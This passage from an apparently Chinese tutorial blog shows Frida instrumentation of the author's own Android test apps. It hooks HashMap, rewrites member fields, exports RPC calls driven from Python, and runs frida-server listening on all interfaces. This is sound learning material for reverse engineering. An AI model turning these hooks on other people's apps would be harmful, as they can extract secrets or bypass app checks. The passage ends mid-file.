java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        Map&lt;String,String&gt; mapv5le0n9 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        mapv5le0n9.put(<span class="string">&quot;ISBN 978-7-5677-8742-1&quot;</span>,<span class="string">&quot;Android项目开发实战入门&quot;</span>);</span><br><span class="line">        mapv5le0n9.put(<span class="string">&quot;ISBN 978-7-5677-8741-4&quot;</span>,<span class="string">&quot;C语言项目开发实战入门&quot;</span>);</span><br><span class="line">        mapv5le0n9.put(<span class="string">&quot;ISBN 978-7-5677-9897-1&quot;</span>,<span class="string">&quot;PHP项目开发实战入门&quot;</span>);</span><br><span class="line">        mapv5le0n9.put(<span class="string">&quot;ISBN 978-7-5677-8748-7&quot;</span>,<span class="string">&quot;Java项目开发实战入门&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Set&lt;String&gt; set = mapv5le0n9.keySet();</span><br><span class="line">        Iterator&lt;String&gt; it = set.iterator();</span><br><span class="line">        Log.d(<span class="string">&quot;5map&quot;</span>,<span class="string">&quot;key:&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(it.hasNext())&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">                Log.d(<span class="string">&quot;5map&quot;</span>,it.next()+<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Log.d(<span class="string">&quot;5map&quot;</span>,<span class="string">&quot;key toString&quot;</span> + mapv5le0n9.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.5.1.png" class=""><p>使用js代码查看Map的<code>toString()</code>方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test02.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hashmap888</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;java.util.HashMap&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(instance.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;ISBN&quot;</span>)!=-<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found HashMap&quot;</span>,instance)</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;HashMap toString&quot;</span>, instance.<span class="title function_">toString</span>())</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Search Completed!&quot;</span>)&#125;</span><br><span class="line">        </span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">setTimeout</span>(hashmap888,<span class="number">2000</span>)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.5.2.png" class=""><p>尝试hook Map的<code>put()</code>方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test02.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hashmap888</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.util.HashMap&quot;</span>).<span class="property">put</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1, args2</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">put</span>(args1, args2)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, args2, result&quot;</span>, args1, args2, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hashmap888)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/3.5.3.png" class=""><h1 id="4-一些查漏补缺"><a href="#4-一些查漏补缺" class="headerlink" title="4. 一些查漏补缺"></a>4. 一些查漏补缺</h1><h2 id="4-1-利用adb在文本框输入内容"><a href="#4-1-利用adb在文本框输入内容" class="headerlink" title="4.1 利用adb在文本框输入内容"></a>4.1 利用adb在文本框输入内容</h2><p>通过hook或者算法得出来的结果不能复制到Android设备的文本框中，可以使用adb传入结果。点击需要填入结果的文本框，通过以下命令传到文本框中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell input text &lt;结果&gt;</span><br></pre></td></tr></table></figure><h2 id="4-2-动静态处理成员变量"><a href="#4-2-动静态处理成员变量" class="headerlink" title="4.2 动静态处理成员变量"></a>4.2 动静态处理成员变量</h2><p>用js修改静态成员变量：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;&lt;包名+类名&gt;&quot;</span>).&lt;静态成员变量&gt;.<span class="property">value</span> = &lt;想要修改的值&gt;</span><br></pre></td></tr></table></figure><p>用js修改动态成员变量：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;&lt;包名+类名&gt;&quot;</span>,&#123;</span><br><span class="line">    <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance&quot;</span>, instance)</span><br><span class="line">        instance.&lt;动态成员变量&gt;.<span class="property">value</span> = &lt;想要修改的值&gt;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//如果遇到与变量同名的方法，标识变量只需在开头添加下划线即可</span></span><br><span class="line">        instance.<span class="property">_</span>&lt;动态成员变量&gt;.<span class="property">value</span> = &lt;想要修改的值&gt;</span><br><span class="line">    &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="5-RPC远程调用"><a href="#5-RPC远程调用" class="headerlink" title="5. RPC远程调用"></a>5. RPC远程调用</h1><h2 id="5-1-远程调用"><a href="#5-1-远程调用" class="headerlink" title="5.1 远程调用"></a>5.1 远程调用</h2><p>在主动调用成功之后才能用RPC。拿test01做例子，我们将没有用到的<code>secret()</code>方法进行主动调用：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//rpc.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">invoke</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.v5le0n9.test01.MainActivity&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance:&quot;</span>,instance)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance:&quot;</span>,instance.<span class="title function_">secret</span>())</span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">        &#125;) </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">setTimeout</span>(invoke,<span class="number">2000</span>)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/5.1.1.png" class=""><p>没有问题，接下来就使用RPC来远程调用：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//rpc.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">invoke</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.v5le0n9.test01.MainActivity&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance:&quot;</span>,instance)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance:&quot;</span>,instance.<span class="title function_">secret</span>())</span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">        &#125;) </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//setTimeout(invoke,2000)</span></span><br><span class="line">rpc.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">invokefunc</span>:invoke</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#loader.py</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_message_handler</span>(<span class="params">message,payload</span>):</span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line"><span class="comment">#pid = device.spawn([&quot;com.v5le0n9.test01&quot;])</span></span><br><span class="line"><span class="comment">#device.resume</span></span><br><span class="line"><span class="comment">#time.sleep(1)</span></span><br><span class="line"><span class="comment">#session = device.attach(pid)</span></span><br><span class="line">session = device.attach(<span class="string">&quot;com.v5le0n9.test01&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;rpc.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>,my_message_handler)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">&quot;Enter Command:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> command == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> command == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">        script.exports.invokefunc()</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/5.1.2.png" class=""><h2 id="5-2-多主机多手机多端口混连"><a href="#5-2-多主机多手机多端口混连" class="headerlink" title="5.2 多主机多手机多端口混连"></a>5.2 多主机多手机多端口混连</h2><h3 id="5-2-1-多主机"><a href="#5-2-1-多主机" class="headerlink" title="5.2.1 多主机"></a>5.2.1 多主机</h3><p>现在的模拟器大多都可以实现多主机连接，如果真机中ADB WiFi也可以实现多主机连接，但貌似用数据线连接只能连一台主机。也就是说模拟器可以跟物理机连的同时也可以跟虚拟机连。</p><img src="/posts/ab7319a3/5.2.3.png" class=""><p>将虚拟机与模拟器断开连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb disconnect 192.168.24.104:5555</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/5.2.1.png" class=""><h3 id="5-2-2-多端口"><a href="#5-2-2-多端口" class="headerlink" title="5.2.2 多端口"></a>5.2.2 多端口</h3><p>通过objection可以看到Android设备与主机连接的默认端口为27042。</p><img src="/posts/ab7319a3/5.2.2.png" class=""><p>更改端口为9999，即Android设备监听9999端口判断是否有主机连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frida-server-12.8.0-android-x86 -l 0.0.0.0:9999</span><br></pre></td></tr></table></figure><p>此时27042端口不管用了，而是用的是9999端口。这个远程连接也提供了很多API给我们查看设备信息，比如枚举应用程序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#loader.py</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_message_handler</span>(<span class="params">message,payload</span>):</span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#device = frida.get_usb_device()</span></span><br><span class="line">device = frida.get_device_manager().add_remote_device(<span class="string">&#x27;192.168.24.104:9999&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(device.enumerate_applications())</span><br><span class="line"><span class="comment">#pid = device.spawn([&quot;com.v5le0n9.test01&quot;])</span></span><br><span class="line"><span class="comment">#device.resume</span></span><br><span class="line"><span class="comment">#time.sleep(1)</span></span><br><span class="line"><span class="comment">#session = device.attach(pid)</span></span><br><span class="line">session = device.attach(<span class="string">&quot;com.v5le0n9.test01&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;rpc.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>,my_message_handler)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">&quot;Enter Command:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> command == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> command == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">        script.exports.invokefunc()</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/5.2.4.png" class=""><h3 id="5-2-3-多手机"><a href="#5-2-3-多手机" class="headerlink" title="5.2.3 多手机"></a>5.2.3 多手机</h3><p>主机可以连接多台手机，使用adb连接即可。不使用adb连接也可以用上述远程调用的方法连接手机。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">device = frida.<span class="title function_">get_device_manager</span>().<span class="title function_">add_remote_device</span>(<span class="string">&#x27;192.168.24.104:9999&#x27;</span>)</span><br><span class="line">device = frida.<span class="title function_">get_device_manager</span>().<span class="title function_">add_remote_device</span>(<span class="string">&#x27;192.168.24.103:9999&#x27;</span>)</span><br><span class="line">device = frida.<span class="title function_">get_device_manager</span>().<span class="title function_">add_remote_device</span>(<span class="string">&#x27;192.168.24.102:6666&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="5-3-互联互通，动态修改"><a href="#5-3-互联互通，动态修改" class="headerlink" title="5.3 互联互通，动态修改"></a>5.3 互联互通，动态修改</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--activity_main.xml--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/editTextTextPersonName&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:ems</span>=<span class="string">&quot;10&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:hint</span>=<span class="string">&quot;Name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:inputType</span>=<span class="string">&quot;textPersonName&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:minHeight</span>=<span class="string">&quot;48dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintHorizontal_bias</span>=<span class="string">&quot;0.497&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintVertical_bias</span>=<span class="string">&quot;0.196&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/editTextTextPersonName2&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:ems</span>=<span class="string">&quot;10&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:hint</span>=<span class="string">&quot;Password&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:inputType</span>=<span class="string">&quot;textPersonName&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:minHeight</span>=<span class="string">&quot;48dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintHorizontal_bias</span>=<span class="string">&quot;0.497&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintVertical_bias</span>=<span class="string">&quot;0.309&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;Login&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintHorizontal_bias</span>=<span class="string">&quot;0.498&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintVertical_bias</span>=<span class="string">&quot;0.653&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/textView3&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;Please input your username and password&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">&quot;parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">&quot;parent&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">androidx.constraintlayout.widget.ConstraintLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MainActivity.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Base64;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        <span class="type">EditText</span> <span class="variable">username</span> <span 